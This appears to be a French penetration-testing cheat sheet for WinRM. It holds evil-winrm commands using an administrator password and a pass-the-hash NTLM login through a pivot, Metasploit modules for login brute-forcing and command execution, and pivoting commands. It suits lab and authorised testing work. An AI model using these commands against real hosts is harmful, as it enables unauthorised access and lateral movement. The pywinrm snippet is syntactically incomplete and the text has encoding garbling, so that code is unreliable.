# WINRM

## evil-winrm

* [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

```sh
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

### avec hash ntlm et Ã  travers un pivot:

```sh
evil-winrm -i 172.16.1.20 -u katwamba -H 14a71f9e65448d83e8c63d46355837c3
```

### commandes pratiques:

```sh
upload <fichier>
download <fichier>
```

## pywinrm

```sh
sudo pip install pywinrm
python
session = winrm.Session('<IPorHost>', auth=('administrator','<password here>')
```

## brute force: metasploit

use auxiliary/scanner/winrm/winrm_login

## lancer une commande

use auxiliary/scanner/winrm/winrm_cmd

## pivot sur windows

winrs -?
Enter-PSSession
